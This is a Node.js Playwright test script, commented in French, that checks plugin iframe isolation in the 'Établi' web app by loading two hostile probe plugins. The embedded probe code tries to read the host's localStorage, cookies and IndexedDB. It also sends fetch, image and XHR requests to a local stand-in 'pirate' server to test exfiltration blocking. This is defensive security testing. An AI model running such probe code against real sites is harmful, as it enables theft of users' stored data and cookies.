// Essai d'isolation de la version web « Établi seul » (sans serveur), dans un vrai Chromium (docs/19, §4).
//   node scripts/essais-origines-web.mjs              suppose `npm run build:web` déjà fait (apps/desktop/dist-web)
//   node scripts/essais-origines-web.mjs --constat    ne fait pas échouer sur les failles connues (affiche seulement)
//
// Ce que fait le script : il sert la version web construite (comme un hébergement statique), y ajoute DEUX plugins
// « sondes » hostiles (sonde-a, sonde-b) à la liste des plugins, ouvre l'application et fait tenter à chaque sonde
// de lire l'application, l'IndexedDB de l'hôte et le stockage de l'autre sonde. Deux hébergements sont joués :
//   - « avec CORS » : les fichiers sous /plugins/ portent Access-Control-Allow-Origin: * (GitHub Pages, serveur Établi,
//     Netlify ou Cloudflare Pages avec le fichier _headers produit par scripts/construire-web.mjs) ;
//   - « sans CORS » : un hébergement qui n'envoie pas l'en-tête (WebView Android de Capacitor). Les cadres à origine
//     opaque ne peuvent alors pas charger leurs modules : l'application doit retomber sur la même origine (limite connue).
// Code de retour : 0 si tous les essais passent, 1 sinon. Playwright (@playwright/test) et Chromium sont requis ;
// le Chromium se règle avec ETABLI_CHROMIUM (par défaut /opt/pw-browsers/chromium s'il existe).
import { createServer } from "node:http";
import { once } from "node:events";
import { existsSync, readFileSync } from "node:fs";
import { extname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { avecCsp, listerFichiers } from "./construire-web.mjs";

const racine = fileURLToPath(new URL("..", import.meta.url));
const dist = join(racine, "apps", "desktop", "dist-web");
const constat = process.argv.includes("--constat");

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json",
  ".webmanifest": "application/manifest+json",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".woff2": "font/woff2",
};

/** Ce que la sonde tente depuis son cadre. Chaque entrée renvoie du texte ; « refusé: » précède le nom de l'erreur. */
const SONDE_JS = `
const verdict = async (f) => {
  try { return "réussi: " + String(await f()).slice(0, 80); }
  catch (e) { return "refusé: " + (e && e.name ? e.name : String(e)); }
};
const bd = (nom) => new Promise((resolve, reject) => {
  const r = indexedDB.open(nom);
  r.onsuccess = () => resolve(r.result);
  r.onerror = () => reject(r.error);
});
window.__sonde = {
  origine: () => self.origin,
  parentDocument: () => verdict(() => window.parent.document.title),
  parentStockage: () => verdict(() => window.parent.localStorage.getItem("etabli.secret-hote")),
  topCookie: () => verdict(() => window.top.document.cookie),
  stockageLocal: () => verdict(() => localStorage.getItem("secret-hote") ?? "vide"),
  indexedDBHote: () => verdict(async () => {
    const db = await bd("etabli");
    const noms = [...db.objectStoreNames].join(",");
    db.close();
    if (!noms) throw new Error("base vide");
    return "magasins " + noms;
  }),
  listeBases: () => verdict(async () => (await indexedDB.databases()).map((d) => d.name).join(",") || "aucune"),
  ecrire: (nom) => verdict(async () => {
    localStorage.setItem("secret-" + nom, "valeur-" + nom);
    document.cookie = "secret-" + nom + "=1; path=/; SameSite=Strict";
    await caches.open("secret-" + nom);
    return "écrit";
  }),
  lire: (nom) => verdict(async () => {
    const l = localStorage.getItem("secret-" + nom);
    const c = document.cookie.includes("secret-" + nom);
    const k = (await caches.keys()).includes("secret-" + nom);
    if (l !== null || c || k) return "VU local=" + l + " cookie=" + c + " cache=" + k;
    return "rien";
  }),
  lireHote: () => verdict(async () => (await (await fetch("/index.html")).text()).slice(0, 15)),
  exfiltrer: (url) => verdict(async () => {
    await fetch(url + "/fetch", { mode: "no-cors" });
    await new Promise((r) => { const i = new Image(); i.onload = i.onerror = r; i.src = url + "/image"; });
    await new Promise((r) => { const x = new XMLHttpRequest(); x.onloadend = r; x.open("GET", url + "/xhr"); x.send(); });
    return "envoyé";
  }),
  serviceWorker: () => verdict(async () => String(await navigator.serviceWorker.getRegistrations().then((r) => r.length))),
};
parent.postMessage({ sonde: "prête" }, "*");
`;

function manifeste(id) {
  return {
    id,
    name: `Sonde ${id.slice(-1).toUpperCase()}`,
    version: "1.0.0",
    apiVersion: "^2",
    author: "Essai",
    description: "Sonde hostile de l'essai d'isolation",
    color: "#cc0000",
    icon: "sigma",
    permissions: [],
    miniApps: [{ id: "sonde", name: "Sonde", description: "Essai", icon: "triangle", entry: "apps/sonde/index.html", dataVersion: 1 }],
  };
}

/** Sert la version web, plus les sondes. `cors` : envoyer Access-Control-Allow-Origin sous /plugins/. */
function servir({ cors }) {
  const fichiers = new Map(listerFichiers(dist).map((f) => [`/${f}`, join(dist, f)]));
  const sondes = ["sonde-a", "sonde-b"];
  const virtuels = new Map();
  for (const id of sondes) {
    virtuels.set(
      `/plugins/${id}/apps/sonde/index.html`,
      { type: "text/html; charset=utf-8", corps: avecCsp(`<!doctype html><html><head><meta charset="utf-8"><title>sonde</title><script type="module" src="../../sonde.js"></script></head><body>sonde ${id}</body></html>`) },
    );
    virtuels.set(`/plugins/${id}/sonde.js`, { type: "text/javascript; charset=utf-8", corps: SONDE_JS });
    virtuels.set(`/plugins/${id}/manifest.json`, { type: "application/json", corps: JSON.stringify(manifeste(id)) });
  }
  const index = JSON.parse(readFileSync(join(dist, "plugins", "index.json"), "utf-8"));
  const indexAvecSondes = JSON.stringify([...index, ...sondes.map((id) => ({ manifest: manifeste(id), official: true }))]);
  virtuels.set("/plugins/index.json", { type: "application/json", corps: indexAvecSondes });

  const serveur = createServer((req, res) => {
    const chemin = decodeURIComponent((req.url ?? "/").split("?")[0] ?? "/");
    const entree = chemin === "/" ? "/index.html" : chemin;
    const virtuel = virtuels.get(entree);
    const fichier = fichiers.get(entree);
    if (!virtuel && !fichier) {
      res.statusCode = 404;
      res.end("Introuvable");
      return;
    }
    res.setHeader("Content-Type", virtuel ? virtuel.type : (MIME[extname(fichier)] ?? "application/octet-stream"));
    if (cors && entree.startsWith("/plugins/")) res.setHeader("Access-Control-Allow-Origin", "*");
    // Le service worker de la version construite ne sert à rien ici (et fausserait les essais) : on le désactive.
    if (entree === "/sw.js") {
      res.end("self.addEventListener('install',()=>self.skipWaiting());");
      return;
    }
    res.end(virtuel ? virtuel.corps : readFileSync(fichier));
  });
  return new Promise((resolve) => serveur.listen(0, "127.0.0.1", () => resolve(serveur)));
}

// ——— Compte rendu ———

const resultats = [];
function essai(nom, ok, detail = "") {
  resultats.push({ nom, ok });
  console.log(`${ok ? "  ✔" : "  ✘"} ${nom}${detail && !ok ? `\n      → ${detail}` : ""}`);
}
/** Constat d'une limite connue : affiché, jamais bloquant. */
function limite(nom, detail) {
  console.log(`  ⚠ limite connue : ${nom}${detail ? ` (${detail})` : ""}`);
}

async function ouvrirSonde(page, id) {
  await page.locator(`button[data-plugin="${id}"]`).click();
  // Un plugin qui n'a qu'une mini-app l'ouvre directement ; sinon on clique sur la première carte.
  await page.locator("button.open").first().click({ timeout: 1500 }).catch(() => {});
  const cadre = await attendreCadre(page, id);
  await cadre.waitForFunction(() => Boolean(window.__sonde), null, { timeout: 8000 });
  return cadre;
}

async function attendreCadre(page, id) {
  const debut = Date.now();
  while (Date.now() - debut < 8000) {
    const cadre = page.frames().find((f) => f.url().includes(`/plugins/${id}/`));
    if (cadre) return cadre;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`cadre de ${id} introuvable`);
}

/** Joue tous les essais pour un hébergement. `opaque` : ce que l'application doit avoir choisi. */
async function jouer(navigateur, { nom, cors, opaque }) {
  console.log(`\n== Hébergement ${nom}`);
  const serveur = await servir({ cors });
  // « Site pirate » : tout ce qui lui parvient est une fuite.
  const recus = [];
  const pirate = createServer((req, res) => {
    recus.push(req.url);
    res.end("");
  }).listen(0, "127.0.0.1");
  await once(pirate, "listening");
  const urlPirate = `http://127.0.0.1:${pirate.address().port}`;
  const origine = `http://127.0.0.1:${serveur.address().port}`;
  const contexte = await navigateur.newContext({ viewport: { width: 1200, height: 800 } });
  const page = await contexte.newPage();
  try {
    await page.goto(`${origine}/`);
    // Cibles à protéger : stockage et IndexedDB de l'application, un cookie.
    await page.evaluate(() => {
      localStorage.setItem("etabli.secret-hote", "SECRET-HOTE");
      document.cookie = "secret-hote=1; path=/; SameSite=Strict";
    });
    await page.reload();
    const sondeA = await ouvrirSonde(page, "sonde-a");
    const sandbox = await page.locator('iframe[src*="/plugins/sonde-a/"]').getAttribute("sandbox");
    const sonde = (cadre, fonction, ...args) => cadre.evaluate(([f, a]) => window.__sonde[f](...a), [fonction, args]);

    const origineVue = await sonde(sondeA, "origine");
    if (opaque) {
      essai("le cadre a une origine opaque (sandbox sans allow-same-origin)", sandbox === "allow-scripts" && origineVue === "null", `${sandbox} ${origineVue}`);
    } else {
      essai("(repli) le cadre garde l'origine de l'hébergement faute de CORS : il reste utilisable", origineVue === origine, `${sandbox} ${origineVue}`);
    }

    const lectures = [
      ["lire le document de l'application (window.parent.document)", "parentDocument"],
      ["lire le stockage local de l'application (window.parent.localStorage)", "parentStockage"],
      ["lire les cookies de l'application (window.top.document.cookie)", "topCookie"],
      ["ouvrir l'IndexedDB « etabli » de l'hôte", "indexedDBHote"],
      ["voir les noms des bases de l'hôte (indexedDB.databases)", "listeBases"],
      ["lire la page de l'application par fetch", "lireHote"],
    ];
    for (const [libelle, f] of lectures) {
      const r = await sonde(sondeA, f);
      const ok = opaque ? r.startsWith("refusé:") : true;
      if (opaque) essai(`la sonde ne peut pas ${libelle}`, ok, r);
      else if (!r.startsWith("refusé:")) limite(`la sonde peut ${libelle}`, r);
    }
    if (opaque) {
      const stock = await sonde(sondeA, "stockageLocal");
      essai("le stockage local (localStorage) est inaccessible au cadre opaque", stock.startsWith("refusé:"), stock);
    }

    await sonde(sondeA, "exfiltrer", urlPirate);
    await new Promise((r) => setTimeout(r, 500));
    essai("la politique du plugin bloque fetch, image et XMLHttpRequest vers un site extérieur", recus.length === 0, recus.join(", "));

    // Stockage d'un plugin visible d'un autre ?
    await sonde(sondeA, "ecrire", "a");
    const sondeB = await ouvrirSonde(page, "sonde-b");
    const vuDeB = await sonde(sondeB, "lire", "a");
    if (opaque) essai("la sonde B ne voit ni le stockage, ni le cookie, ni le cache de la sonde A", !vuDeB.startsWith("réussi: VU"), vuDeB);
    else if (vuDeB.startsWith("réussi: VU")) limite("la sonde B voit le stockage de la sonde A", vuDeB);

    // Un vrai plugin du dépôt reste utilisable dans ce mode (modules, styles, polices, politique de sécurité).
    await page.locator('button[data-plugin="agenda"]').click();
    await page.locator("button.open").first().click();
    const agenda = await attendreCadre(page, "agenda");
    const rendu = await agenda
      .waitForFunction(() => (document.querySelector("#app")?.children.length ?? 0) > 0, null, { timeout: 8000 })
      .then(() => true, () => false);
    essai("un vrai plugin (agenda) affiche sa mini-app dans ce mode", rendu);
  } finally {
    await contexte.close();
    serveur.close();
    pirate.close();
  }
}

async function principal() {
  if (!existsSync(join(dist, "index.html"))) throw new Error("apps/desktop/dist-web est absent : lancez d'abord « npm run build:web ».");
  const { chromium } = await import("@playwright/test");
  const local = "/opt/pw-browsers/chromium";
  const executablePath = process.env.ETABLI_CHROMIUM || (existsSync(local) ? local : undefined);
  const navigateur = await chromium.launch({ executablePath, args: ["--no-sandbox"] });
  try {
    await jouer(navigateur, { nom: "avec CORS sur /plugins/", cors: true, opaque: true });
    await jouer(navigateur, { nom: "sans CORS (WebView Android)", cors: false, opaque: false });
  } finally {
    await navigateur.close();
  }
  const echecs = resultats.filter((r) => !r.ok);
  console.log(`\n${resultats.length - echecs.length}/${resultats.length} essais réussis`);
  process.exit(echecs.length > 0 && !constat ? 1 : 0);
}

principal().catch((err) => {
  console.error(err);
  process.exit(1);
});
